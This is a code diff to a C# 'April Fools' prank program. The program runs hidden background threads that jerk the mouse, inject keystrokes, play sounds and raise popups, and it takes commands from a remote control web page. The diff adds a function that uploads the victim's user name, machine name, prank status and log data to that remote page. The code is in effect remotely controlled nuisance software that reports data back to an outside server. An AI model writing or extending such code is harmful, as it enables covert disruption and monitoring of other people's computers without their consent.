@@ -206,7 +206,7 @@ namespace AprilFools
         #region External control
         private static void ExternalControlReadThread()
         {
-            Console.WriteLine("ExternalControlReadThread Started");
+            GenericsClass.Log("ExternalControlReadThread Started");
             Thread.CurrentThread.Name = "ExternalControlReadThread";
             Thread.CurrentThread.IsBackground = true;
             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
@@ -218,10 +218,24 @@ namespace AprilFools
             }
         }
 
+        private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, bool inludeLogs=false)
+        {
+            string pageUrl = ctrlWebPage;
+
+            if (updateSchedule)
+            {
+                pageUrl += "?upload=Y&uploaddata=" + schedule;
+                if (includeTimeStamp)
+                    pageUrl += "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
+                if (inludeLogs)
+                    pageUrl += "\n\n " + GenericsClass.GetLogData();
+            }
+            return GenericsClass.DownloadHTML(pageUrl);
+        }
+
         private static void ReadFromCtrlWebPage(bool firstRun=false)
         {
-            string downloadUrl = ctrlWebPage + "";
-            string html = GenericsClass.DownloadHTML(downloadUrl);
+            string html = FetchCtrlPage();
 
             if (html != null)
             {
@@ -249,7 +263,7 @@ namespace AprilFools
                         }
                         if (!handled)
                         {
-                            Console.WriteLine("ReadFromCtrlWebPage() - Un-handled new evet from controller \"" + externalCmdString + "\"");
+                            GenericsClass.Log("ReadFromCtrlWebPage() - Un-handled new evet from controller \"" + externalCmdString + "\"");
                         }
                     }
 
@@ -262,7 +276,7 @@ namespace AprilFools
                         {
                             if (e == PrankerEvent.CancelAllNewComands) break;
 
-                            Console.WriteLine("ReadFromCtrlWebPage() Recieved new Cmd - " + DateTime.Now + " - " + e);
+                            GenericsClass.Log("ReadFromCtrlWebPage() Recieved new Cmd - " + DateTime.Now + " - " + e);
                             if (e == PrankerEvent.KillApplication)
                             {
                                 _applicationRunning = false;
@@ -283,16 +297,14 @@ namespace AprilFools
 
                 //if schedule changed re-upload current
                 //should always do this to keep page timestamp up to date
-                string timeStamp = "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
-                string uploadUrl = ctrlWebPage + "?upload=Y&uploaddata=" + schedule + timeStamp;
-                GenericsClass.DownloadHTML(uploadUrl);
+                FetchCtrlPage(true,true);
             }
             else
             {
                 if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
                 {
                     _externalControlThreadRunning = false;
-                    Console.WriteLine("ReadFromCtrlWebPage() - External control page timed out after " + externalControlPageFailAttempts + " attempts.");
+                    GenericsClass.Log("ReadFromCtrlWebPage() - External control page timed out after " + externalControlPageFailAttempts + " attempts.");
 #if _TESTING
                     //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
                     GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
@@ -408,7 +420,7 @@ namespace AprilFools
             }
             else
             {
-                Console.WriteLine("MapKey(HotKeyEventArgs) - Failed");
+                GenericsClass.Log("MapKey(HotKeyEventArgs) - Failed");
             }
             return mapped;
         }
@@ -437,7 +449,7 @@ namespace AprilFools
         /// </summary>
         public static void EraticMouseThread()
         {
-            Console.WriteLine("EraticMouseThread Started");
+            GenericsClass.Log("EraticMouseThread Started");
             Thread.CurrentThread.Name = "EraticMouseThread";
             Thread.CurrentThread.IsBackground = true;
             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
@@ -460,7 +472,7 @@ namespace AprilFools
                 }
                 else if (_allPrankingEnabled && _eraticMouseRunning)
                 {
-                    // Console.WriteLine(Cursor.Position.ToString());
+                    // GenericsClass.Log(Cursor.Position.ToString());
 
                     if (GenericsClass.Random.Next(100) > 100-oddsOfMoving)
                     {
@@ -491,7 +503,7 @@ namespace AprilFools
         {
             try
             {
-                Console.WriteLine("EraticKeyboardThread Started");
+                GenericsClass.Log("EraticKeyboardThread Started");
                 Thread.CurrentThread.Name = "EraticKeyboardThread";
                 Thread.CurrentThread.IsBackground = true;
                 Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
@@ -528,7 +540,7 @@ namespace AprilFools
         /// </summary>
         public static void SoundThread()
         {
-            Console.WriteLine("SoundThread Started");
+            GenericsClass.Log("SoundThread Started");
             Thread.CurrentThread.Name = "Sound Thread";
             Thread.CurrentThread.IsBackground = true;
             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
@@ -600,7 +612,7 @@ namespace AprilFools
         /// </summary>
         public static void PopupThread()
         {
-            Console.WriteLine("PopupThread Started");
+            GenericsClass.Log("PopupThread Started");
             Thread.CurrentThread.Name = "PopupThread";
             Thread.CurrentThread.IsBackground = true;
             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
@@ -697,7 +709,7 @@ namespace AprilFools
         private static void InitApplication(int startDelay)
         {
             Thread.CurrentThread.Name = "Pranker Main Thread";
-            Console.WriteLine("April Fools Prank by: Dougie Fresh");
+            GenericsClass.Log("April Fools Prank by: Dougie Fresh");
 
 #if _TESTING
             //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
@@ -705,7 +717,7 @@ namespace AprilFools
             //GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
 #endif
             //register hotkey(s)
-            Console.WriteLine("Registering Hotkeys");
+            GenericsClass.Log("Registering Hotkeys");
             HotKeyManager.HotKeyPressed += new EventHandler<HotKeyEventArgs>(HotKeyPressed);
             HotKeyManager.RegisterHotKey((KeyModifiers.Control | KeyModifiers.Windows), Keys.F2);
             HotKeyManager.RegisterHotKey((KeyModifiers.Control | KeyModifiers.Windows), Keys.F4);
@@ -715,14 +727,14 @@ namespace AprilFools
             HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.D2);
 #endif
 
-            Console.WriteLine("Starting Core Threads");
+            GenericsClass.Log("Starting Core Threads");
             externalControlThread = new Thread(new ThreadStart(ExternalControlReadThread));
             mouseThread = new Thread(new ThreadStart(EraticMouseThread));
             eraticKeyboardThread = new Thread(new ThreadStart(EraticKeyboardThread));
             soundThread = new Thread(new ThreadStart(SoundThread));
             popupThread = new Thread(new ThreadStart(PopupThread));
 
-            Console.WriteLine("Build Schedule");
+            GenericsClass.Log("Build Schedule");
             schedule = new EventScheduler<PrankerEvent>();
 
             //setup delayed start
@@ -804,7 +816,7 @@ namespace AprilFools
             GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
 #endif
 
-            Console.WriteLine("Terminating all threads");
+            GenericsClass.Log("Terminating all threads");
             // Kill all threads and exit application
             mouseThread.Abort();
             eraticKeyboardThread.Abort();
@@ -819,34 +831,34 @@ namespace AprilFools
 
             if (e.Modifiers == (KeyModifiers.Control | KeyModifiers.Windows) && e.Key == Keys.F2)
             {
-                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Start Pranking");
+                GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Start Pranking");
                 StartPranking();
             }
             else if (e.Modifiers == (KeyModifiers.Control | KeyModifiers.Windows) && e.Key == Keys.F4)
             {
-                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Stop Pranking");
+                GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Stop Pranking");
                 PausePranking();
             }
             else if (e.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && e.Key == Keys.F4)
             {
-                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Kill Application");
+                GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Kill Application");
                 //stop everything and kill application
                 _applicationRunning = false;
             }
             else if (e.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && e.Key == Keys.D1)
             {
-                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Test Key 1");
+                GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Test Key 1");
                 TestCode1();
             }
             else if (e.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && e.Key == Keys.D2)
             {
-                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Test Key 2");
+                GenericsClass.Log("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Test Key 2");
                 TestCode2();
             }
             else if (keyMapCounter != 0 && !MapKey(e))//try to map this unknown key (combos are ignored)
             {
                 //uncaught hotkey
-                Console.WriteLine("HotKeyManager_HotKeyPressed() - UnActioned - " + e.Modifiers + "+" + e.Key + "");
+                GenericsClass.Log("HotKeyManager_HotKeyPressed() - UnActioned - " + e.Modifiers + "+" + e.Key + "");
             }
         }
 
@@ -977,9 +989,9 @@ namespace AprilFools
                     break;
             }
             if(handled)
-                Console.WriteLine("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e);
+                GenericsClass.Log("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e);
             else
-                Console.WriteLine("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e + " - NOT HANDLED");
+                GenericsClass.Log("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e + " - NOT HANDLED");
         }
         
         /// <summary>
